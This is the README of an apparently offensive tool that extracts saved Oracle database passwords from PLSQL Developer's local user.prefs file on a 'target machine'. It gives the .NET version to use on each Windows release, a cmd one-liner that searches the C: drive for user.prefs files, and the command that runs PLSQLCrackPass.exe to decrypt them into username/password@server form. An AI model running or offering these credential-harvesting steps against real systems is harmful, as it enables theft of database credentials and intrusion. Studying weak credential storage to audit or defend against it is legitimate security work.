# PLSQL_Crack_Pass
### Oralce 数据库连接工具 PLSQL Developer 保存在本地的密码抓取

根据目标机器上 `.Net` 版本使用对应的版本工具，Win2008推荐 `Net3.5` ，Win2012推荐 `Net4.0`

1、获取 user.prefs 文件所在的位置

`for /r c: %a in (*user.prefs) do @echo %a`

![images](https://github.com/TryA9ain/PLSQL_Crack_Pass/blob/master/1.png)

2、使用工具破解保存在本地的密码

`PLSQLCrackPass.exe -p user.prefs_Path`

`解密后结果为：<username>/<password>@<server>`

![images](https://github.com/TryA9ain/PLSQL_Crack_Pass/blob/master/2.png)
